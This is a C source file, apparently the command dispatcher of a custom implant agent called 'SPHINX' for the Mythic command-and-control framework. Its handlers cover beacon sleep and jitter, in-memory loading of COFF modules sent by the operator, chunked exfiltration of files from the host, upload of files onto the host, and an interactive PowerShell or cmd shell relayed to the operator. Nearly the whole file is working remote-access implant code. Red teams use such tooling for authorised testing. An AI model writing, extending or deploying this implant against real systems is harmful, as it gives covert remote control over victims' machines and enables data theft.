#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "api_table.h"
#include "parser.h"
#include "dispatcher.h"
#include "packer.h"
#include "module.h"
#include "loader.h"
#include "module_helpers.h"
#include "file_transfer.h"
#include "outbound.h"
#include "shell.h"

extern volatile uint32_t g_sleep_time;
extern volatile uint32_t g_jitter;
volatile int g_exit_flag = 0;

// Convert a param that arrives as a raw big-endian uint32 (4 bytes) to a uint32.
// Used by synthetic tasks (download_resp/upload_resp) where Mythic packs
// numbers as pack_uint32 (not ASCII).
static uint32_t param_raw_u32(const Param* p) {
    if (!p || p->size < 4) return 0;
    const uint8_t* d = p->data;
    return ((uint32_t)d[0] << 24) | ((uint32_t)d[1] << 16) |
           ((uint32_t)d[2] << 8)  |  (uint32_t)d[3];
}

// Accepts decimal and hexadecimal (0x prefix).
// Converts the first bytes of a TLV param to uint32_t.
// Reads up to p->size bytes. No null terminator required.
static uint32_t param_to_u32(const Param* p) {
    uint32_t val = 0;
    uint32_t i   = 0;

    // 0x / 0X prefix?
    if (p->size >= 2 && p->data[0] == '0' &&
        (p->data[1] == 'x' || p->data[1] == 'X')) {
        i = 2;  // skip "0x"
        for (; i < p->size; i++) {
            uint8_t c = p->data[i];
            if (c >= '0' && c <= '9')
                val = (val << 4) | (c - '0');
            else if (c >= 'a' && c <= 'f')
                val = (val << 4) | (c - 'a' + 10);
            else if (c >= 'A' && c <= 'F')
                val = (val << 4) | (c - 'A' + 10);
            else
                break;
        }
    } else {
        // Plain decimal
        for (i = 0; i < p->size; i++) {
            if (p->data[i] >= '0' && p->data[i] <= '9')
                val = val * 10 + (p->data[i] - '0');
            else
                break;
        }
    }
    return val;
}

// Module name → command_id mapping (built-ins are not listed here)
static const struct {
    const char* name;
    uint8_t     cmd_id;
} g_module_ids[] = {
    { "pwd",      0x43 },
    { "ls",       0x41 },
    { "cd",       0x42 },
    { "ps",       0x52 },
    { "info",     0x70 },
    { "net",      0x71 },
    { "sec",      0x72 },
    { NULL,       0x00 }
};

static uint8_t module_name_to_id(const char* name) {
    for (uint32_t i = 0; g_module_ids[i].name != NULL; i++) {
        if (strcmp(g_module_ids[i].name, name) == 0)
            return g_module_ids[i].cmd_id;
    }
    return 0;
}

void handle_builtin(const Task* task) {
    const char* output = 0;
    uint8_t status = STATUS_COMPLETE;

    switch (task->command_id) {
        case 0x38: { // sleep
            if (task->param_count >= 1)
                g_sleep_time = param_to_u32(&task->params[0]);
            if (task->param_count >= 2)
                g_jitter = param_to_u32(&task->params[1]);
            output = "sleep updated";
            break;
        }
        case 0x80: {
            // exit: set flag; agent terminates cleanly after sending the response
            output = "exiting";
            g_exit_flag = 1;
            break;
        }
        case 0x90: { // load: params[0] = module name, params[1] = COFF .o bytes
            if (task->param_count < 2 || task->params[0].size == 0 || task->params[1].size == 0) {
                output = "load: usage: name + coff bytes";
                status = STATUS_FAILED;
                break;
            }

            char mod_name[MODULE_NAME_LEN];
            size_t name_len = task->params[0].size;
            if (name_len >= MODULE_NAME_LEN) name_len = MODULE_NAME_LEN - 1;
            memcpy(mod_name, task->params[0].data, name_len);
            mod_name[name_len] = '\0';

            uint8_t cmd_id = module_name_to_id(mod_name);
            if (cmd_id == 0) {
                output = "load: unknown module name";
                status = STATUS_FAILED;
                break;
            }

            Module* mod = coff_load(task->params[1].data, task->params[1].size,
                                    mod_name, cmd_id, &g_api);
            fprintf(stderr, "[SPHINX] load: received %d bytes\n", (int)task->params[1].size);
            if (mod == NULL) {
                output = "load: coff_load failed";
                status = STATUS_FAILED;
            } else if (module_register(mod) != 0) {
                free(mod);
                output = "load: register failed";
                status = STATUS_FAILED;
            } else {
                free(mod);   // module_register copies the struct; heap allocation no longer needed
                output = "load: ok";
            }
            break;
        }

        case 0x91: { // unload
            if (task->param_count >= 1 && task->params[0].size > 0) {
                uint8_t cmd_id = (uint8_t)param_to_u32(&task->params[0]);
                if (module_unregister(cmd_id) == 0)
                    output = "unloaded";
                else {
                    output = "unload: command not found";
                    status = STATUS_FAILED;
                }
            } else {
                output = "unload: missing command_id";
                status = STATUS_FAILED;
            }
            break;
        }
        case 0x92: { // list
            // Dynamic buffer for output (built-ins use fixed strings; this one builds it)
            char* buf = (char*)malloc(512);
            if (!buf) {
                output = "list: out of memory";
                status = STATUS_FAILED;
                break;
            }

            size_t off = 0;
            int any = 0;
            for (uint32_t i = 0; i < module_count; i++) {
                if (!module_table[i].loaded) continue;
                int n = sprintf(buf + off,
                                "[+]\t[0x%02x]\t%s\tcode@%p\t(%zu bytes)\n",
                                module_table[i].command_id,
                                module_table[i].name,
                                module_table[i].code_base,
                                module_table[i].code_size);
                if (n < 0) break;
                off += (size_t)n;
                any = 1;
            }
            if (!any) {
                off = (size_t)sprintf(buf, "[!]\tNo modules loaded\n");
            }
            out_add_task_response(task->task_uuid, (uint8_t*)buf, off, STATUS_COMPLETE);
            free(buf);
            output = NULL;  // response already sent manually
            break;
        }

        case 0x51: { // download <path>: params[0] = path (UTF-8, no null terminator)
            if (task->param_count < 1 || task->params[0].size == 0) {
                output = "download: missing path\n";
                status = STATUS_FAILED;
                break;
            }
            char path[512];
            size_t plen = task->params[0].size;
            if (plen >= sizeof(path)) plen = sizeof(path) - 1;
            memcpy(path, task->params[0].data, plen);
            path[plen] = '\0';

            uint8_t buf_init[1024];
            size_t buf_init_len = 0;
            if (file_download_start(task->task_uuid, path, buf_init, sizeof(buf_init), &buf_init_len) == 0) {
                // raw INIT block goes straight into the outbound buffer
                out_add_raw(buf_init, buf_init_len);
                output = "download: started\n";
            } else {
                output = "download: failed to open file\n";
                status = STATUS_FAILED;
            }
            break;
        }
        case 0x50: { // upload (modal file+path): params[0]=file_id, params[1]=path
            if (task->param_count < 2 || task->params[0].size == 0 || task->params[1].size == 0) {
                output = "upload: missing file_id/path\n";
                status = STATUS_FAILED;
                break;
            }
            char file_id[37];
            size_t flen = task->params[0].size;
            if (flen > 36) flen = 36;
            memcpy(file_id, task->params[0].data, flen);
            file_id[flen] = '\0';

            char path[512];
            size_t plen = task->params[1].size;
            if (plen >= sizeof(path)) plen = sizeof(path) - 1;
            memcpy(path, task->params[1].data, plen);
            path[plen] = '\0';

            if (file_upload_begin(path, file_id, task->task_uuid) == 0) {
                // Request the first chunk (pull 0x04) in the same POST body
                uint8_t pull[1024];
                size_t pull_len = 0;
                int pr = file_upload_pull_next(pull, sizeof(pull), &pull_len);
                fprintf(stderr, "[SPHINX] case 0x50: upload_begin ok, pull r=%d len=%u\n",
                        pr, (unsigned)pull_len);
                if (pr == 1)
                    out_add_raw(pull, pull_len);
                output = "upload: started\n";
            } else {
                output = "upload: failed to create file\n";
                status = STATUS_FAILED;
            }
            break;
        }
        case 0x53: { // download_resp: params[0] = file_id returned by Mythic after INIT
            if (task->param_count < 1 || task->params[0].size == 0) {
                output = "download: no file_id\n";
                status = STATUS_FAILED;
                break;
            }
            char file_id[37];
            size_t flen = task->params[0].size;
            if (flen > 36) flen = 36;
            memcpy(file_id, task->params[0].data, flen);
            file_id[flen] = '\0';

            if (file_download_set_file_id(file_id) == 0)
                output = "download: file_id ok\n";
            else {
                output = "download: no active download\n";
                status = STATUS_FAILED;
            }
            break;
        }
        case 0x54: { // upload_resp: params[0]=chunk_num(u32), params[1]=chunk_data, params[2]=total_chunks(u32, optional)
            if (task->param_count < 2 || task->params[1].size == 0) {
                output = "upload: empty chunk\n";
                status = STATUS_FAILED;
                break;
            }
            if (file_upload_write(task->params[1].data, task->params[1].size) != 0) {
                output = "upload: write failed\n";
                status = STATUS_FAILED;
                break;
            }

            // total_chunks (params[2], uint32 big-endian binary) → update upload state
            if (task->param_count >= 3 && task->params[2].size >= 4)
                file_upload_set_total(param_raw_u32(&task->params[2]));

            // After writing, pull the next chunk in the same POST body
            uint8_t pull[1024];
            size_t pull_len = 0;
            int r = file_upload_pull_next(pull, sizeof(pull), &pull_len);
            if (r == 1)
                out_add_raw(pull, pull_len);
            output = "upload: chunk written\n";
            break;
        }
        case 0x60: { // shell_start: params[0] = "powershell"|"cmd"|"pwsh"
            if (task->param_count < 1 || task->params[0].size == 0) {
                output = "shell: missing type";
                status = STATUS_FAILED;
                break;
            }
            if (shell_active()) {
                output = "shell: already active";
                status = STATUS_FAILED;
                break;
            }
            char which[32];
            size_t wlen = task->params[0].size;
            if (wlen >= sizeof(which)) wlen = sizeof(which) - 1;
            memcpy(which, task->params[0].data, wlen);
            which[wlen] = '\0';
            if (!shell_start(task->task_uuid, which)) {
                output = "shell: spawn failed";
                status = STATUS_FAILED;
                break;
            }
            // Do not send 0xA4 — task stays open until shell_exit closes it.
            // The initial message travels as 0xDA; translator returns completed=False.
            const char* started_msg = "shell: started\n";
            out_add_shell_data(task->task_uuid, 1,
                               (const uint8_t*)started_msg, strlen(started_msg));
            output = NULL;
            break;
        }
        case 0x61: { // shell_write: params[0] = stdin bytes
            if (!shell_active()) {
                output = "shell: not active";
                status = STATUS_FAILED;
                break;
            }
            if (task->param_count >= 1 && task->params[0].size > 0)
                shell_write(task->params[0].data, task->params[0].size);
            output = "";
            status = STATUS_COMPLETE;
            break;
        }
        case 0x62: { // shell_stop
            if (!shell_active()) {
                output = "shell: not active";
                status = STATUS_FAILED;
                break;
            }
            // Flush pending output and close the original shell task
            if (shell_has_output()) shell_pump();
            const char* ended = "shell: session ended";
            out_add_task_response(shell_get_task_uuid(),
                                  (uint8_t*)ended, strlen(ended), STATUS_COMPLETE);
            shell_stop();
            output = "shell: stopped";
            status = STATUS_COMPLETE;
            break;
        }
        case 0x63: { // shell_resize: params[0] = "cols rows"
            if (shell_active() && task->param_count >= 1 && task->params[0].size > 0) {
                char buf[32];
                size_t blen = task->params[0].size < sizeof(buf) - 1
                              ? task->params[0].size : sizeof(buf) - 1;
                memcpy(buf, task->params[0].data, blen);
                buf[blen] = '\0';
                int cols = 0, rows = 0;
                sscanf(buf, "%d %d", &cols, &rows);
                if (cols > 0 && rows > 0) shell_resize((short)cols, (short)rows);
            }
            output = "";
            status = STATUS_COMPLETE;
            break;
        }


        default:
            output = "unknown command\n";
            status = STATUS_FAILED;
            break;
    }
    // 0xA4 delivers the message to the operator.
    // output==NULL means the task already sent its own response
    // (e.g. shell_start uses 0xDA to stay open).
    if (output)
        out_add_task_response(task->task_uuid, (uint8_t*)output, strlen(output), status);
}

void dispatch(Task* tasks, uint32_t task_count) {

    // ── PASS 1: Execute all tasks ──
    for (uint32_t i = 0; i < task_count; i++) {
        fprintf(stderr, "[SPHINX] dispatch: task cmd_id=0x%02x params=%u\n",
                tasks[i].command_id, tasks[i].param_count);
        Module* mod = find_module(tasks[i].command_id);
        if (mod && mod->loaded) {
            mod->run(&g_api, tasks[i].task_uuid, tasks[i].params, tasks[i].param_count);
        } else {
            handle_builtin(&tasks[i]);
        }
    }

    // If a file download is active, push the next CONT block
    if (file_download_active()) {
        fprintf(stderr, "[SPHINX] download active, generating CONT\n");
        uint8_t* cont = (uint8_t*)malloc(CHUNK_SIZE + 512);
        if (cont) {
            size_t cont_len = 0;
            int r = file_download_next(cont, CHUNK_SIZE + 512, &cont_len);
            fprintf(stderr, "[SPHINX] file_download_next r=%d len=%u\n", r, (unsigned)cont_len);
            if (r == 1 && cont_len > 0)
                out_add_raw(cont, cont_len);
            free(cont);
            // r==0 → finished (internal reset); r==-1 → error (no block emitted)
        }
    } else {
        fprintf(stderr, "[SPHINX] no active download (active=%d)\n", file_download_active());
    }

    // Flush accumulated interactive shell output before the next POST
    if (shell_has_output())
        shell_pump();
}
